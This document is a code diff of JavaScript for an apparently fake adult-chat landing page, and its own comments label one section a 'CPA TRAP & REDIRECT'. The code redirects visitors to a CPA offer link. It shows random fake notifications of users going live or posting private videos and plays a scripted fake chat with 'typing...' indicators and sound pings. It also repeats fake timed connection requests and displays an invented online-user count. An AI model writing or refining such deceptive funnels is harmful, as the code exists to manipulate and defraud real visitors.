-        // Set Default
-        selectProfile(profiles[0], null);
-        renderSidebar();
-
-        // 3. TRIGGER CPA VERIFICATION
+        // ==========================================
+        // 4. CPA TRAP & REDIRECT
+        // ==========================================
         function triggerVerification() {
             if (isVerifying) return;
             isVerifying = true;
@@ -325,17 +373,87 @@
             window.location.href = targetCpaLink;
         }
 
-        // 4. SYNCED INSTANT REQUEST POPUP (image_01ab9a.png)
+
+        // ==========================================
+        // 5. TOAST NOTIFICATIONS (Live Realism)
+        // ==========================================
+        const toastMsgs = ["just went Live!", "wants to chat", "is looking for a partner", "uploaded a new private video"];
+        function showToast() {
+            if(isVerifying) return;
+            const tUser = profiles[Math.floor(Math.random() * profiles.length)];
+            const tAction = toastMsgs[Math.floor(Math.random() * toastMsgs.length)];
+            
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `<img src="${tUser.photo}" style="width:20px;height:20px;border-radius:50%; object-fit:cover;"> <span><strong>${tUser.name}</strong> ${tAction}</span>`;
+            
+            document.getElementById('toastContainer').appendChild(toast);
+            playPing(); // Optional subtle sound for toast
+            
+            setTimeout(() => { toast.remove(); }, 4500);
+            
+            // Randomly trigger next toast between 8-15 seconds
+            setTimeout(showToast, Math.random() * 7000 + 8000);
+        }
+        setTimeout(showToast, 4000);
+
+
+        // ==========================================
+        // 6. FLOATING CHAT LOGIC WITH "TYPING..."
+        // ==========================================
+        setTimeout(() => {
+            if(!isVerifying) {
+                const fcProfile = profiles[0]; 
+                document.getElementById('fcImg').src = fcProfile.photo;
+                document.getElementById('fcName').innerText = fcProfile.name;
+                document.getElementById('fcBlurImg').src = fcProfile.photo;
+                document.getElementById('floatingChat').style.display = 'block';
+                
+                const typing = document.getElementById('fcTyping');
+                typing.innerText = `${fcProfile.name.split(' ')[0]} is typing...`;
+                typing.style.display = 'block';
+                
+                // Sequence Messages
+                setTimeout(() => {
+                    typing.style.display = 'none';
+                    document.getElementById('msg1').style.display = 'block';
+                    playPing();
+                    
+                    setTimeout(() => {
+                        typing.style.display = 'block';
+                        setTimeout(() => {
+                            typing.style.display = 'none';
+                            document.getElementById('msg2').style.display = 'block';
+                            playPing();
+                            
+                            setTimeout(() => {
+                                document.getElementById('msgPhoto').style.display = 'block';
+                                playPing();
+                            }, 1500);
+                        }, 2000);
+                    }, 1000);
+                }, 2000);
+            }
+        }, 3500);
+
+        function closeFloatingChat(e) {
+            e.stopPropagation();
+            document.getElementById('floatingChat').style.display = 'none';
+        }
+
+
+        // ==========================================
+        // 7. INSTANT REQUEST POPUP
+        // ==========================================
         let reqInterval;
         function showRequestPopup() {
             if(isVerifying) return;
+            const rp = profiles[Math.floor(Math.random() * profiles.length)];
             
-            // Pick a random profile from our central database
-            const randomProfile = profiles[Math.floor(Math.random() * profiles.length)];
-            
-            document.getElementById('reqUserImg').src = randomProfile.photo;
-            document.getElementById('reqUserHandle').innerText = randomProfile.handle;
+            document.getElementById('reqUserImg').src = rp.photo;
+            document.getElementById('reqUserName').innerText = rp.name;
             document.getElementById('requestModal').style.display = 'flex';
+            playPing(); // Loud ping when request appears!
             
             let time = 10;
             document.getElementById('reqTimer').innerText = time;
@@ -351,29 +469,13 @@
         function closeRequestPopup() {
             document.getElementById('requestModal').style.display = 'none';
             clearInterval(reqInterval);
-            setTimeout(showRequestPopup, 10000); // Popup again in 10s
+            setTimeout(showRequestPopup, 12000); 
         }
 
-        // Show Instant Request after 5 seconds
-        setTimeout(showRequestPopup, 5000);
+        // Show first request after 8 seconds
+        setTimeout(showRequestPopup, 8000);
 
-        // 5. SYNCED FLOATING CHAT (image_01aff8.png)
-        setTimeout(() => {
-            if(!isVerifying) {
-                const fcProfile = profiles[0]; // Hailey Rose
-                document.getElementById('fcImg').src = fcProfile.photo;
-                document.getElementById('fcName').innerText = fcProfile.name;
-                document.getElementById('fcBlurImg').src = fcProfile.photo;
-                document.getElementById('floatingChat').style.display = 'block';
-            }
-        }, 3000);
-
-        function closeFloatingChat(e) {
-            e.stopPropagation();
-            document.getElementById('floatingChat').style.display = 'none';
-        }
-
-        // Dynamic Online User Counter
+        // Counter
         setInterval(() => {
             let base = 142700;
             document.getElementById('onlineCounter').innerText = (base + Math.floor(Math.random() * 80)).toLocaleString();
